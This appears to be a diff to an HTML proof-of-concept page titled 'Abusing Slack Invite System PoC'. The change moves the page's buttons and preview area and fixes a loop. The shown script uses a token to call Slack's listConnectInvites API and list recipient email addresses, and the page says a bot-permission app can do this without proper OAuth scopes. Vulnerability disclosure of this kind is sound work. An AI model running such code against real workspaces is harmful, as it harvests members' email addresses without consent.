@@ -10,6 +10,21 @@
 
     <!-- Latest compiled and minified JavaScript -->
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    
+</head>
+<body onload="getObject();">
+    
+    <div class="container pt-3">
+        <h1>Abusing Slack Invite System PoC</h1>
+        <p>The app uses bot permissions and can fetch email addresses of workspace members without proper oauth permissions</p>
+    
+        <button type="button" class="btn btn-success" onclick="startPoC();">Run PoC</button>
+        <button type="button" class="btn btn-danger" onclick="fetchEmails();">Fetch Emails</button>
+        <button type="button" class="btn btn-info" onclick="localStorage.clear();">Reset PoC</button>
+                   
+        <h3><br />Preview:-</h3><hr />
+        <pre class="preview"></pre>
+    </div>
     <script>
 
 
@@ -25,7 +40,7 @@
             var count = localStorage.getItem("memberscount");
             fetch("https://slack.com/api/conversations.listConnectInvites?&token="+token).then(
                     response => response.json()).then((json) => {
-                    for(var i=json["invites"].length - 1; i >= 0 - count); i--)
+                    for(var i=json["invites"].length - 1; i >= 0; i--)
                         document.getElementsByClassName("preview")[0].innerHTML += json["invites"][i]["invite"]["recipient_email"]+"<br />";
                 })
         }
@@ -76,20 +91,5 @@
         
         
         </script>
-</head>
-<body onload="getObject();">
-    
-    <div class="container pt-3">
-        <h1>Abusing Slack Invite System PoC</h1>
-        <p>The app uses bot permissions and can fetch email addresses of workspace members without proper oauth permissions</p>
-    
-        <button type="button" class="btn btn-success" onclick="startPoC();">Run PoC</button>
-        <button type="button" class="btn btn-danger" onclick="fetchEmails();">Fetch Emails</button>
-        <button type="button" class="btn btn-info" onclick="localStorage.clear();">Reset PoC</button>
-                   
-        <h3><br />Preview:-</h3><hr />
-        <pre class="preview"></pre>
-    </div>
-    
 </body>
 </html>
